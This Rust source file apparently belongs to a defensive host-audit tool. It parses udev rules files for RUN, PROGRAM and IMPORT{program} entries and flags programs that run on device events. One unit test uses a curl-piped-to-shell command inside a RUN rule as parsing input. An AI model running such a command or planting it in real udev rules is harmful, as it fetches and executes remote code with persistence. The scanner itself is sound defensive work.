//! udev rules that run programs.

use std::path::{Path, PathBuf};

use super::{finish, logical_lines, review_fix, snip};
use crate::ctx::Ctx;
use crate::finding::{Acc, Finding, Severity};
use crate::patterns;

const NAME: &str = "udev";

/// Extract program values from RUN / PROGRAM / IMPORT{program} keys.
pub fn programs(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = line;
    while let Some(i) = rest.find(|c: char| c.is_ascii_uppercase()) {
        rest = &rest[i..];
        let key_end = rest.find(['=', '+', ':', '!', ',']).unwrap_or(rest.len());
        let key = &rest[..key_end];
        rest = &rest[key_end..];
        let is_prog = key == "RUN" || key.starts_with("RUN{program") || key == "PROGRAM" || key.starts_with("IMPORT{program");
        let after_op = rest.trim_start_matches(['+', ':', '=', '!']);
        if let Some(body) = after_op.strip_prefix('"') {
            if let Some(end) = body.find('"') {
                if is_prog && !key.starts_with("RUN{builtin") {
                    out.push(body[..end].to_string());
                }
                rest = &body[end + 1..];
                continue;
            }
        }
        if rest.is_empty() {
            break;
        }
        rest = &rest[1..];
    }
    out
}

pub fn run(ctx: &Ctx) -> Vec<Finding> {
    let mut files: Vec<(PathBuf, bool)> = Vec::new();
    for (d, etc) in [("/etc/udev/rules.d", true), ("/run/udev/rules.d", true), ("/usr/lib/udev/rules.d", false), ("/lib/udev/rules.d", false)] {
        let Ok(c) = ctx.fs.resolve(Path::new(d), true) else { continue };
        for p in ctx.list(&c) {
            if p.to_string_lossy().ends_with(".rules") && !files.iter().any(|(x, _)| *x == p) {
                files.push((p, etc));
            }
        }
    }
    let mut out = Vec::new();
    for (p, etc) in files {
        let Some(text) = ctx.read_text(&p) else { continue };
        let owner = ctx.owner(&p);
        ctx.record_file(&Ctx::key(NAME, &p), &p, owner.package().is_some());
        let mut acc = Acc::default();
        let mut runs = 0;
        for (ln, line) in logical_lines(&text, &['#']) {
            for prog in programs(&line) {
                runs += 1;
                if etc {
                    acc.add(Severity::Low, format!("line {ln}: runs a program on device events: {}", snip(&prog)));
                }
                if let Some(bin) = prog.split_whitespace().next() {
                    if let Some((s, r)) = patterns::exec_location(bin) {
                        acc.add(s, format!("line {ln}: {r}"));
                    }
                }
                for h in patterns::scan(&prog) {
                    acc.add(h.sev, format!("line {ln}: {} [{}]", h.what, snip(&prog)));
                }
            }
        }
        // Unowned rules only matter if they run something.
        let base = (runs > 0).then_some(Severity::Med);
        let owner = if runs == 0 && owner == crate::pkg::Ownership::Unowned { crate::pkg::Ownership::Unknown } else { owner };
        if let Some(f) = finish(ctx, NAME, &p, acc, &owner, base, |_| format!("{}\nThen: sudo udevadm control --reload", review_fix(ctx, &p))) {
            out.push(f);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rule_parsing() {
        assert_eq!(programs(r#"ACTION=="add", SUBSYSTEM=="usb", RUN+="/usr/local/bin/x.sh %k""#), vec!["/usr/local/bin/x.sh %k"]);
        assert_eq!(programs(r#"KERNEL=="sd*", PROGRAM="/bin/id", RUN{builtin}+="kmod load""#), vec!["/bin/id"]);
        assert_eq!(programs(r#"IMPORT{program}="/usr/bin/foo", ENV{X}="1""#), vec!["/usr/bin/foo"]);
        assert!(programs(r#"SUBSYSTEM=="net", NAME="eth0""#).is_empty());
        assert_eq!(programs(r#"RUN+="/bin/sh -c 'curl http://x|sh'""#), vec!["/bin/sh -c 'curl http://x|sh'"]);
    }
}
